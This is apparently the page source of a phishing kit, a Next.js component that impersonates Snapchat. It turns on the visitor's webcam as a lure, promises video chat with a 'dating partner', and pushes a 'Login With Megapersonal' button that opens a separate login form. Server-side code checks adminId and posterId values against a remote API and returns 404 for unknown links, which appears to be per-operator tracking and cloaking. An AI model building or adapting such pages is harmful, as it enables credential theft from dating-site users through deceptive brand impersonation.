import { useState } from "react";
import Login from "../../../components/Login";
import Webcam from "react-webcam";
import { API_URL, site } from "../../../config";
import Image from "next/image";

export default function Home() {
  const [showForm, setShowForm] = useState(true);

  return (
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
      {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
        Waiting...
      </h1> */}
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <>
          {showForm ? (
            <div class="p-5 w-[400px]">
              <div class="mx-auto flex items-center justify-center mt-5">
                <img
                  class="h-16 w-20 text-center"
                  src="/images/snapchat-icon.png"
                  alt=""
                />
              </div>
              <h2 class="text-3xl font-bold text-blue-900 text-center">
                Snapchat
              </h2>
              <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                Login With Megapersonals and enjoy with{" "}
                <b class="text-[#00BE70]">Snapchat video chat</b> your dating
                partner.
              </p>

              <button
                class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"
                onClick={() => setShowForm(false)}
              >
                <span>
                  <img
                    src="/images/logo-potrait.jpg"
                    class="w-12 h-12"
                    alt=""
                  />
                </span>
                <span>Login With Megapersonal</span>
              </button>
            </div>
          ) : (
            <Login />
          )}
        </>
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
